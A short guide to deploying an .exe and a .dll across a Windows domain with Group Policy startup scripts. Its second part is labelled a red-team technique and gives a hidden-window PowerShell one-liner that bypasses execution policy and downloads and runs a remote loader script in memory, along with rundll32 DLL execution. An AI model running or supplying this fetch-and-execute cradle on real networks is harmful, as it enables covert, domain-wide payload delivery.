1. Deploying .EXE via GPO (Startup Script)

This is common when using startup scripts for machine-wide deployment.
Step-by-step:

    Place updatepolicy.exe in a network share that is readable by domain computers (e.g., \\DC01\Software\updatepolicy.exe).

    Create a startup script:
```
@echo off
\\DC01\Software\updatepolicy.exe /silent

Save it as deploy_updatepolicy.bat
```
    Create or edit a GPO:

    Go to Group Policy Management.

    Create a new GPO (e.g., DeployUpdatePolicy).

    Navigate to:

    Computer Configuration → Policies → Windows Settings → Scripts (Startup/Shutdown) → Startup

    Add deploy_updatepolicy.bat.

    Link the GPO to the target OU.

    Force GPO update on a target system (optional):

```gpupdate /force```
2. Deploying .DLL via GPO (Using a Loader)

Windows Group Policy cannot natively load DLLs as executables. You need a loader binary or PowerShell-based reflective loader to execute the DLL.
Option A: Use rundll32

If your DLL exports a valid function:
```
rundll32.exe \\DC01\Software\updatepolicy.dll,EntryPoint
```
    Replace EntryPoint with the exported function name (must be stdcall).

Option B: Use PowerShell Reflective DLL Loader (Red Team TTP)
```
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://DC01/updatepolicy_loader.ps1')"
```
Where updatepolicy_loader.ps1 is a script that loads the DLL into memory using Add-Type or raw .NET assembly loading.
